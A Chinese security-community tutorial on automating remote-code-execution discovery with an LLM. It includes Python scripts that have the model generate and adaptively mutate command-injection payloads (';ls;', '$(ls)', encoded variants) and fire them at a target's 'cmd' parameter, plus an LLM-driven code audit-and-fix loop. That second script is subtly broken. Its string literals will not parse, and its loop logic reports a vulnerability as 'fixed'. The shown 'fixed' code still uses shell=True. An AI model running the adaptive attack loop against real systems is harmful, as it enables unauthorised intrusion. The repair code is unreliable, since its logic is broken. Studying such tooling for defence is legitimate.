# 基于大模型LLM的黑白盒RCE漏洞自动化挖掘-先知社区

> **来源**: https://xz.aliyun.com/news/16385  
> **文章ID**: 16385

---

**引言**  
远程代码执行（Remote Code Execution，RCE）漏洞是最危险的网络安全漏洞之一，攻击者可以通过此类漏洞远程执行任意代码，进而控制目标系统。由于RCE漏洞的危害性极大，因此发现和修复这些漏洞是网络安全领域的重要任务。传统的漏洞挖掘方法依赖于手动渗透测试和静态分析，效率较低且依赖于安全专家的经验。近年来，大语言模型（LLM）技术，尤其是如OpenAI Codex等模型的出现，为自动化漏洞挖掘提供了新的思路和方法。

本文将深入探讨如何利用大语言模型（LLM）进行黑盒和白盒的RCE漏洞自动化挖掘，结合具体的代码示例和自动化工具，展示如何高效地检测潜在的RCE漏洞，并总结这一方法的技术分析与优势。

---

**黑盒漏洞挖掘**  
黑盒测试（Black-box Testing）是一种不依赖于目标系统内部实现的测试方法，测试人员仅通过外部接口与系统交互，模拟攻击者的行为来发现潜在漏洞。黑盒漏洞挖掘通常依赖于输入数据生成（如恶意HTTP请求、文件上传等），并通过系统的响应来判断是否存在漏洞。  
在RCE漏洞的黑盒挖掘中，攻击者通过提交恶意输入数据（如构造恶意文件上传、注入恶意命令等）来测试系统是否能被远程控制。由于黑盒测试不依赖系统的源代码，因此它能够模拟真实攻击者的攻击方式，评估系统的安全性。

**白盒漏洞挖掘**  
与黑盒测试不同，白盒测试（White-box Testing）要求测试人员了解目标系统的内部结构，包括源代码、架构和设计。白盒漏洞挖掘侧重于代码审计、静态分析和动态分析，目的是通过对源代码的深入理解，发现潜在的漏洞和安全缺陷。  
在RCE漏洞的白盒挖掘中，攻击者通过审查代码中潜在的不安全函数（如os.system()、subprocess.Popen()等）来识别是否存在可以被利用的远程命令执行漏洞。由于测试人员可以访问源代码，因此白盒漏洞挖掘比黑盒测试更具精确性，但也更为依赖代码质量。

**大模型LLM在漏洞挖掘中的应用**  
大语言模型（LLM）通过对大规模数据集的训练，能够理解和生成自然语言文本。近年来，基于Transformer架构的模型（如GPT-3、Codex等）不仅能够处理自然语言，还能够理解编程语言，解析代码结构，并根据给定的输入生成相关输出。这种强大的文本生成和理解能力使得LLM在自动化漏洞挖掘领域中得到了广泛的应用。  
LLM在漏洞挖掘中的应用主要包括：生成恶意输入（黑盒测试）、静态分析代码（白盒测试）、检测漏洞模式、自动化渗透测试等。通过结合LLM的强大能力，漏洞挖掘过程能够变得更加高效、智能和自动化。

---

**基于大模型（LLM）的黑盒RCE漏洞挖掘**  
在黑盒漏洞挖掘中，LLM可以自动化生成恶意请求，模拟攻击者行为，检验系统是否能够正确处理这些输入。LLM不仅可以生成常见的攻击payload（如SQL注入、XSS、RCE等），还能够根据目标系统的特征动态调整攻击策略。  
技术实现

* 使用LLM生成恶意payload：LLM根据目标应用的接口或功能生成攻击payload。例如，在Web应用中，LLM可以生成恶意的HTTP请求，包含命令注入、文件上传、路径遍历等攻击。
* 自动化测试：LLM与目标系统进行交互，自动化提交请求，分析系统的响应。如果系统的响应表明存在异常行为（如执行了注入的命令），则判定为存在漏洞。
* 智能化反馈：LLM能够根据系统响应分析攻击效果，进一步调整生成的payload，优化漏洞检测的准确性。

代码实现  
假设目标系统提供一个cmd参数，攻击者可以通过该参数执行任意系统命令。我们将通过LLM生成一个命令注入payload，并尝试触发RCE漏洞。

```
import openai
import requests

# 设置OpenAI API密钥
openai.api_key = "your-api-key"

# 目标URL
target_url = "http://example.com/api/execute_command"

# 目标API接口描述
api_description = """
这是一个API接口，允许用户通过'cmd'参数执行系统命令。用户输入的命令没有进行任何过滤。请分析此接口是否存在RCE漏洞，并生成攻击payload。
"""

# 使用LLM生成攻击payload
def generate_payload(api_description):
    prompt = f"""
    根据以下API接口描述，生成恶意输入或者攻击payload：
    {api_description}
    攻击目标是远程命令执行（RCE），请生成一个可以执行'ls'命令并返回结果的payload。
    """

    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型进行生成
        prompt=prompt,
        max_tokens=150,
        temperature=0.7
    )

    payload = response.choices[0].text.strip()
    return payload

# 发起攻击并测试RCE漏洞
def test_rce_vulnerability(target_url, api_description):
    payload = generate_payload(api_description)
    params = {"cmd": payload}

    try:
        response = requests.get(target_url, params=params)
        if response.status_code == 200:
            print(f"请求成功，正在分析响应：{response.text}")
            # 使用LLM分析响应
            analyze_response_for_rce(response.text)
        else:
            print("未发现RCE漏洞")
    except requests.exceptions.RequestException as e:
        print(f"请求失败：{e}")

# 使用LLM分析响应并判断是否存在RCE
def analyze_response_for_rce(response_text):
    prompt = f"""
    下面是目标系统的响应内容，请分析是否存在RCE漏洞：
    {response_text}
    如果存在RCE漏洞，请说明漏洞原因，并提供修复建议。
    """

    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型进行分析
        prompt=prompt,
        max_tokens=200,
        temperature=0.5
    )

    analysis_result = response.choices[0].text.strip()
    print("LLM分析结果：")
    print(analysis_result)

# 运行测试
test_rce_vulnerability(target_url, api_description)

```

代码阐述

1. generate\_payload()：通过LLM根据接口描述生成恶意的cmd参数值（例如，执行ls命令）。LLM会根据目标接口的特点（如命令执行接口）生成特定的攻击payload。
2. test\_rce\_vulnerability()：通过HTTP GET请求发送包含恶意payload的cmd参数，并获取目标系统的响应。
3. analyze\_response\_for\_rce()：使用LLM对系统的响应内容进行分析，判断是否存在远程代码执行（RCE）漏洞。如果响应中包含命令输出或异常信息（如ls命令的输出），则说明可能存在RCE漏洞

**实战示例：生成并检测RCE漏洞**  
假设我们给定一个目标系统，其中cmd参数未进行验证。目标系统在接受到如下请求时会执行传入的命令：  
GET <http://example.com/api/execute_command?cmd=ls>

如果系统返回类似ls命令的目录列表，则表明目标系统存在RCE漏洞。LLM将通过分析返回的文本（如返回的目录列表或错误信息）来得出是否存在漏洞的结论。  
例如，假设响应是：  
bin boot etc home lib lib64 opt root sbin usr  
LLM的分析结果可能是：  
该响应表明命令'ls'被成功执行，系统可能存在远程命令执行（RCE）漏洞。攻击者可以利用此漏洞执行任意命令，造成严重安全风险。建议修复方法：对'cmd'参数进行严格的输入验证，防止用户输入恶意命令。

**自适应攻击和反馈机制**  
LLM不仅能够生成初步的攻击payload，还能够根据系统的反馈（如响应内容、错误信息等）调整攻击策略。例如，如果初次攻击没有成功，LLM可以调整payload，尝试其他命令或输入，直到触发漏洞或找到更有效的攻击方式。  
示例：自适应攻击  
假设目标系统返回错误信息而不是预期的命令输出  
Error: command not found  
LLM可以分析错误信息并提出调整策略，生成更有针对性的payload，避免简单的命令注入攻击。

```
def adjust_payload_based_on_feedback(response_text):
    prompt = f"""
    目标系统返回以下错误信息：{response_text}
    请分析此错误并生成新的攻击payload，以尝试绕过错误并触发RCE漏洞。
    """

    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型进行分析
        prompt=prompt,
        max_tokens=150,
        temperature=0.7
    )

    adjusted_payload = response.choices[0].text.strip()
    print("LLM调整后的攻击payload：", adjusted_payload)
    return adjusted_payload

```

**完整黑盒自动化漏洞挖掘脚本**

```
import openai
import requests

# 设置OpenAI API密钥
openai.api_key = "your-api-key"

# 目标URL
target_url = "http://example.com/api/execute_command"

# 目标API接口描述
api_description = """
这是一个命令执行API接口，允许用户通过'cmd'参数传递系统命令。假设接口未对输入进行充分验证，
可能导致远程命令执行（RCE）漏洞。我们的目标是检测是否存在RCE漏洞，并通过命令执行确认漏洞的存在。
"""

# 使用LLM生成初始攻击payload
def generate_payload(api_description):
    prompt = f"""
    根据以下API接口描述，生成一个可以触发命令注入（RCE）漏洞的初始攻击payload：
    {api_description}
    假设目标是执行'ls'命令并返回结果，请生成合适的攻击字符串。
    """

    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型
        prompt=prompt,
        max_tokens=150,
        temperature=0.7
    )

    payload = response.choices[0].text.strip()
    return payload

# 使用LLM分析响应并判断是否存在RCE漏洞
def analyze_response_for_rce(response_text):
    prompt = f"""
    以下是目标系统的HTTP响应内容，请分析是否表明存在RCE漏洞：
    {response_text}
    如果确定存在漏洞，请简要说明原因并提供修复建议。
    """

    response = openai.Completion.create(
        model="code-davinci-002",
        prompt=prompt,
        max_tokens=200,
        temperature=0.5
    )

    analysis_result = response.choices[0].text.strip()
    print("LLM分析结果：")
    print(analysis_result)
    return "漏洞" in analysis_result or "RCE" in analysis_result

# 根据反馈调整payload
def adjust_payload_based_on_feedback(api_description, previous_response):
    prompt = f"""
    根据以下API接口描述和目标系统的反馈，调整攻击payload以绕过防护并尝试触发RCE漏洞：
    接口描述：
    {api_description}

    系统反馈：
    {previous_response}

    请生成新的攻击payload，并说明调整逻辑。
    """

    response = openai.Completion.create(
        model="code-davinci-002",
        prompt=prompt,
        max_tokens=150,
        temperature=0.7
    )

    adjusted_payload = response.choices[0].text.strip()
    return adjusted_payload

# 主函数：自适应漏洞检测
def test_rce_vulnerability(target_url, api_description):
    payload = generate_payload(api_description)
    attempt = 1
    max_attempts = 5

    while attempt <= max_attempts:
        print(f"\n[尝试第 {attempt} 次] 使用payload: {payload}")
        params = {"cmd": payload}

        try:
            # 发起HTTP请求
            response = requests.get(target_url, params=params)
            print(f"响应状态码: {response.status_code}")
            print(f"响应内容: {response.text}")

            # 分析响应内容
            if response.status_code == 200:
                if analyze_response_for_rce(response.text):
                    print("检测到RCE漏洞！")
                    return
                else:
                    print("未检测到漏洞，尝试调整攻击策略...")
                    payload = adjust_payload_based_on_feedback(api_description, response.text)
            else:
                print("目标系统未返回有效响应。")
                break

        except requests.exceptions.RequestException as e:
            print(f"请求失败：{e}")
            break

        attempt += 1

    print("经过多次尝试，未能触发RCE漏洞。")

# 运行测试
test_rce_vulnerability(target_url, api_description)

```

---

改进点与完善逻辑

1. 自适应攻击
   * 初始攻击策略是通过generate\_payload函数生成简单的攻击payload，如cmd=ls。
   * 如果攻击失败或系统未返回预期结果，脚本会调用adjust\_payload\_based\_on\_feedback，让LLM根据反馈调整攻击策略。  
     例如：
     + 初始命令未被解析：调整为cmd=$(ls)或cmd=;ls;。
     + 如果需要绕过简单的输入过滤：调整为混淆payload或加入URL编码。
2. LLM响应分析
   * 通过analyze\_response\_for\_rce函数，LLM会从目标系统的HTTP响应中提取关键信息，例如：
     + 是否包含命令的输出（如文件列表、路径信息等）。
     + 是否返回错误提示，表明命令未被正确解析。
   * 如果LLM判断系统可能存在漏洞，则返回成功的结论。
3. 迭代优化
   * 脚本设计了最大尝试次数（如5次），每次都会基于前次响应调整攻击策略，避免单一的攻击模式。
   * 通过自适应机制，能够模拟攻击者的多次尝试行为，提高漏洞检测的成功率。
4. 执行流程
   1. 调用LLM生成初始payload。
   2. 通过HTTP请求向目标系统发送payload。
   3. 分析响应：
      * 如果检测到漏洞，则终止并输出结果。
      * 如果未检测到漏洞，则基于响应调整payload。
   4. 重复上述步骤，直到发现漏洞或尝试次数用尽。  
      运行结果示例

成功触发漏洞：

```
[尝试第 1 次] 使用payload: ls
响应状态码: 200
响应内容: bin  boot  etc  home  lib  lib64
LLM分析结果：
该响应表明命令'ls'被成功执行，系统存在远程命令执行（RCE）漏洞。
建议修复方法：对'cmd'参数进行严格输入验证，或使用白名单限制可执行的命令。
检测到RCE漏洞！
```

失败后调整策略：

```
[尝试第 1 次] 使用payload: ls
响应状态码: 200
响应内容: Error: command not found
未检测到漏洞，尝试调整攻击策略...
调整后的payload: ;ls;
[尝试第 2 次] 使用payload: ;ls;
响应状态码: 200
响应内容: bin  boot  etc  home
LLM分析结果：
该响应表明命令'ls'被成功执行，系统存在远程命令执行（RCE）漏洞。
检测到RCE漏洞！
```

---

**基于大模型（LLM）的白盒RCE漏洞自动化挖掘**  
核心步骤  
白盒漏洞挖掘通过审查代码逻辑和执行路径，直接定位可能存在的漏洞点。结合大模型（LLM）的智能代码审计能力，我们可以大幅提升漏洞发现的效率。  
以下是结合LLM进行白盒RCE漏洞挖掘的核心步骤：

1. 代码解析：输入目标代码，由LLM分析潜在的命令执行逻辑。
2. 漏洞定位：LLM智能审计代码，自动发现不安全的命令执行函数调用，如os.system、exec。
3. 修复建议：结合漏洞点的上下文，LLM提供针对性的修复方案。

核心代码实现

```
import openai

# 设置OpenAI API密钥
openai.api_key = "your-api-key"

# 目标代码片段
code_snippet = """
import os

def execute_command(user_input):
    os.system(user_input)

def run_safe_command():
    command = 'ls'
    os.system(command)
"""

# 使用LLM对代码进行审计
def audit_code_with_llm(code):
    prompt = f"""
    请分析以下Python代码，判断是否存在远程代码执行（RCE）漏洞：
    {code}
    需要你：
    1. 明确代码中不安全的部分，并说明其风险。
    2. 提供相应的修复建议。
    """

    response = openai.Completion.create(
        model="code-davinci-002",
        prompt=prompt,
        max_tokens=300,
        temperature=0.5
    )
    return response.choices[0].text.strip()

# 分析代码
result = audit_code_with_llm(code_snippet)
print("审计结果：")
print(result)

```

**自适应优化机制**  
在白盒RCE漏洞挖掘过程中，结合LLM生成的自动化分析和修复建议后，往往需要通过自适应优化机制来验证修复效果，并根据反馈进行迭代调整。为了提高漏洞挖掘的准确性和效率，我们加入了自反馈优化机制。  
核心优化思路

1. 代码重审机制：在初步修复后，LLM会对修改后的代码进行再次审计，确保漏洞被有效修复。
2. 自适应反馈机制：如果初步修复未能完全消除漏洞，LLM会根据系统反馈（如错误信息、日志输出等）调整修复方案。
3. 自动化循环检测：通过对代码的多次循环检测，确保漏洞得到彻底消除，并且修复后的代码没有引入新的问题。

代码实现：自适应反馈优化机制  
以下是加入自适应反馈机制后的白盒RCE漏洞自动化挖掘代码

```
import openai

# 设置OpenAI API密钥
openai.api_key = "your-api-key"

# 目标代码片段
code_snippet = "
import os

def execute_command(user_input):
    os.system(user_input)

def run_safe_command():
    command = 'ls'
    os.system(command)
"

# 使用LLM对代码进行初步审计
def audit_code_with_llm(code):
    prompt = f"
    请分析以下Python代码，判断是否存在远程代码执行（RCE）漏洞：
    {code}
    需要你：
    1. 明确代码中不安全的部分，并说明其风险。
    2. 提供相应的修复建议。
    "

    response = openai.Completion.create(
        model="code-davinci-002",
        prompt=prompt,
        max_tokens=300,
        temperature=0.5
    )
    return response.choices[0].text.strip()

# 分析代码
def get_rce_vulnerability_feedback(code):
    result = audit_code_with_llm(code)
    print("初步审计结果：")
    print(result)

    if "RCE漏洞" in result or "命令执行" in result:
        return True, result
    return False, result

# 修复漏洞并重新审计代码
def fix_code_and_reaudit(code, fix_suggestions):
    # 使用LLM根据修复建议修改代码
    prompt = f"
    根据以下修复建议，请修改代码并提供修改后的版本：
    修复建议：{fix_suggestions}
    目标代码：{code}
    "
    response = openai.Completion.create(
        model="code-davinci-002",
        prompt=prompt,
        max_tokens=300,
        temperature=0.7
    )
    fixed_code = response.choices[0].text.strip()
    print("修复后的代码：")
    print(fixed_code)
    # 再次进行代码审计
    is_fixed, audit_feedback = get_rce_vulnerability_feedback(fixed_code)

    return is_fixed, fixed_code, audit_feedback

# 自适应反馈机制
def adaptive_feedback_loop(code):
    is_fixed, feedback = get_rce_vulnerability_feedback(code)

    attempt = 1
    max_attempts = 5

    while not is_fixed and attempt <= max_attempts:
        print(f"\n[尝试第 {attempt} 次] 修复并审计代码")
        # 提取修复建议
        fix_suggestions = extract_fix_suggestions(feedback)
        # 修复代码并审计
        is_fixed, fixed_code, audit_feedback = fix_code_and_reaudit(code, fix_suggestions)

        if is_fixed:
            print("漏洞已修复！")
            break

        # 更新反馈
        feedback = audit_feedback
        attempt += 1

    if not is_fixed:
        print("无法修复漏洞，请检查修复建议。")
    else:
        print("最终修复后的代码：")
        print(fixed_code)

# 提取修复建议（示例）
def extract_fix_suggestions(feedback):
    prompt = f"
    以下是LLM的审计反馈，提取其中的修复建议：
    {feedback}
    请简要列出修复步骤。
    "
    response = openai.Completion.create(
        model="code-davinci-002",
        prompt=prompt,
        max_tokens=150,
        temperature=0.6
    )
    return response.choices[0].text.strip()

# 运行自适应反馈循环
adaptive_feedback_loop(code_snippet)

```

代码逻辑解析

1. 初步审计与漏洞检测  
   首先，我们通过get\_rce\_vulnerability\_feedback函数对代码进行初步审计。如果LLM分析到存在潜在的RCE漏洞或不安全的命令执行调用，反馈将被用来生成修复建议。
2. 自适应反馈机制  
   在初次审计后，adaptive\_feedback\_loop函数会启动自适应反馈机制。如果漏洞未能修复，LLM根据修复建议对代码进行修改，并再次进行审计。这个过程会持续进行多次，直到漏洞被彻底修复，或者达到最大尝试次数。
3. 修复代码并重新审计  
   fix\_code\_and\_reaudit函数接收LLM给出的修复建议，修改代码后再次审计，确保修复有效。如果反馈仍然指示有漏洞存在，过程会继续。
4. 提取修复建议  
   在每一轮反馈中，extract\_fix\_suggestions函数提取LLM给出的修复步骤，帮助开发者理解如何修复漏洞，并确保后续代码不会再有类似问题。

示例：自适应修复流程  
假设目标代码存在RCE漏洞，LLM通过自适应反馈循环提供了以下修复过程，  
初步审计结果：

```
审计结果：
存在远程代码执行（RCE）漏洞。函数`execute_command`中使用了`os.system`直接执行用户输入的命令，攻击者可以利用此漏洞执行任意命令。
修复建议：使用`subprocess.run`替代`os.system`，并进行严格的输入验证。
```

自适应修复步骤：

1. 第1轮修复：
   * LLM提供了修复代码：将os.system(user\_input)替换为subprocess.run(user\_input)，并添加输入验证。
   * 反馈：修复代码依然存在漏洞，提示需要增加输入过滤。
2. 第2轮修复：
   * 根据反馈，LLM提供了更严格的输入过滤方案，如白名单机制，仅允许特定命令执行。
   * 反馈：漏洞已修复，代码没有引入新漏洞。  
     最终修复后的代码：

```
import subprocess
def execute_command(user_input):
    allowed_commands = ["ls", "pwd"]
    if user_input in allowed_commands:
        subprocess.run([user_input], shell=True)
    else:
        print("非法命令！")
```
